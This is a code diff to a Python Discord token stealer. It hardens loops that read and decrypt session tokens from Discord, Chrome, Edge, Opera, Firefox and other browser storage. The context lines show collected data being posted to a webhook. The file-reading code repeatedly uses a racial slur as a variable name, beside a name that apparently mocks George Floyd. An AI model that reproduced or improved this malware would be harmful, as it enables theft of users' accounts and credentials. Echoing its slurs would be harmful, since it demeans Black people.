@@ -54,7 +54,6 @@ def sysinfo():
     
     sysinfo = requests.post(webhook, headers=wheaders, json=payload)
 
-#billing info from https://github.com/wodxgod/DTI
 def verifytks(token):
     headers = {
         "authority": "discord.com",
@@ -248,15 +247,17 @@ def distks():
         for file in os.listdir(discordpath):
             if not file.endswith(".log") and not file.endswith(".ldb"):
                 continue
-            
-            with open(f'{discordpath}{file}', "r", errors="ignore") as floyd:
-                nigger = floyd.read()
-                for ambatu in nigger.split("\n"):
-                    encss = re.findall(regexenc, ambatu)
-                    if encss:
-                        enctoken = ambatu.split("dQw4w9WgXcQ:")[1].strip().strip('"').strip("'")[:140]
-                        token = decrypttk(enctoken, key)
-                        verifytks(token) 
+            try:
+                with open(f'{discordpath}{file}', "r", errors="ignore") as floyd:
+                    nigger = floyd.read()
+                    for ambatu in nigger.split("\n"):
+                        encss = re.findall(regexenc, ambatu)
+                        if encss:
+                            enctoken = ambatu.split("dQw4w9WgXcQ:")[1].strip().strip('"').strip("'")[:140]
+                            token = decrypttk(enctoken, key)
+                            verifytks(token) 
+            except:
+                print('no file')
                         
 def chrometks():
     def googlechrome():
@@ -274,12 +275,16 @@ def chrometks():
                     for file in os.listdir(ldb):
                         if not file.endswith(".log") and not file.endswith(".ldb"):
                             continue
-                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
-                            nigger = floyd.read()
-                            for ambatu in nigger.split("\n"):
-                                toks = re.findall(regex, ambatu)
-                                for token in toks:
-                                    verifytks(token)
+                        try:
+                            with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file')
+
     def msedge():
         edgepath = os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data"            
         profiles = os.listdir(edgepath)
@@ -289,13 +294,16 @@ def chrometks():
                 for file in os.listdir(ldb):
                     if not file.endswith(".log") and not file.endswith(".ldb"):
                         continue
-                    with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
-                        nigger = floyd.read()
-                        for ambatu in nigger.split("\n"):
-                            toks = re.findall(regex, ambatu)
-                            for token in toks:
-                                verifytks(token)
-    
+                    try:
+                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                            nigger = floyd.read()
+                            for ambatu in nigger.split("\n"):
+                                toks = re.findall(regex, ambatu)
+                                for token in toks:
+                                    verifytks(token)
+                    except:
+                        print('no file')
+                        
     def operatks():
         operas = ["Opera Stable", "Opera Air Stable"]
         for opera in operas:
@@ -311,32 +319,38 @@ def chrometks():
                     for file in os.listdir(ldb):
                         if not file.endswith(".log") and not file.endswith(".ldb"):
                             continue
-                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                        try:
+                            with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file')
+                    
+    def chnoprofile():
+        noprofile = {
+            'Legcord': os.getenv("APPDATA") + "\\legcord\\Local Storage\\leveldb\\",
+            'Opera GX': os.getenv("APPDATA") + f"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
+        }
+        
+        for name, browser in noprofile.items():
+        
+            if not os.path.exists(browser): 
+                continue                
+            for file in os.listdir(browser):
+                    if not file.endswith(".log") and not file.endswith(".ldb"):
+                        continue
+                    try:
+                        with open(f'{browser}{file}', "r", errors="ignore") as floyd:
                             nigger = floyd.read()
                             for ambatu in nigger.split("\n"):
                                 toks = re.findall(regex, ambatu)
                                 for token in toks:
                                     verifytks(token)
-    
-    def chnoprofile():
-        noprofile = {
-            'Legcord': os.getenv("APPDATA") + "\\legcord\\Local Storage\\leveldb\\",
-            'Opera GX': os.getenv("APPDATA") + f"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
-        }
-        
-        for name, browser in noprofile.items():
-            if not os.path.exists(browser): 
-                continue                
-            for file in os.listdir(browser):
-                if not file.endswith(".log") and not file.endswith(".ldb"):
-                    continue
-                with open(f'{browser}{file}', "r", errors="ignore") as floyd:
-                    nigger = floyd.read()
-                    for ambatu in nigger.split("\n"):
-                        toks = re.findall(regex, ambatu)
-                        for token in toks:
-                            verifytks(token)
-
+                    except:
+                        print('no file')
         
     def othertks():
         otherchbrowsers = {
@@ -364,12 +378,15 @@ def chrometks():
                     for file in os.listdir(ldb):
                         if not file.endswith(".log") and not file.endswith(".ldb"):
                             continue
-                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
-                            nigger = floyd.read()
-                            for ambatu in nigger.split("\n"):
-                                toks = re.findall(regex, ambatu)
-                                for token in toks:
-                                    verifytks(token)
+                        try:
+                            with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file BLUd')
     def othertks2():
         otherchbrowsers = {
             'Orbitum': os.getenv("LOCALAPPDATA") + "\\Orbitum\\User Data",
@@ -387,12 +404,15 @@ def chrometks():
                     for file in os.listdir(ldb):
                         if not file.endswith(".log") and not file.endswith(".ldb"):
                             continue
-                        with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
-                            nigger = floyd.read()
-                            for ambatu in nigger.split("\n"):
-                                toks = re.findall(regex, ambatu)
-                                for token in toks:
-                                    verifytks(token)
+                        try:
+                            with open(f'{ldb}{file}', "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file')
             
     googlechrome()
     msedge()
@@ -413,14 +433,16 @@ def firefox():
                 for discord in discords:
                     ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                     if os.path.exists(firefoxpath + ff):
-                        with open(f"{firefoxpath}{ff}", "r", errors="ignore") as floyd:
-                            nigger = floyd.read()
-                            for ambatu in nigger.split("\n"):
-                                toks = re.findall(regex, ambatu)
-                                for token in toks:
-                                    verifytks(token)
-    
-    def othertks(): #idek if this works because i havent tried it
+                        try:
+                            with open(f"{firefoxpath}{ff}", "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file')
+    def othertks(): 
         otherffbrowsers = {
         'Waterfox': os.getenv("APPDATA") + "\\Waterfox\\Profiles\\",
         'Librewolf': os.getenv("APPDATA") + "\\LibreWolf\\Profiles\\",
@@ -435,13 +457,15 @@ def firefox():
                 for discord in discords:
                     ff = os.path.join(profile, f"storage\\default\\{discord}\\ls\\data.sqlite")
                     if os.path.exists(browser + ff):
-                        with open(f"{browser}{ff}", "r", errors="ignore") as floyd:
-                            nigger = floyd.read()
-                            for ambatu in nigger.split("\n"):
-                                toks = re.findall(regex, ambatu)
-                                for token in toks:
-                                    verifytks(token)
-
+                        try:
+                            with open(f"{browser}{ff}", "r", errors="ignore") as floyd:
+                                nigger = floyd.read()
+                                for ambatu in nigger.split("\n"):
+                                    toks = re.findall(regex, ambatu)
+                                    for token in toks:
+                                        verifytks(token)
+                        except:
+                            print('no file')
     mozff()
     othertks()
 
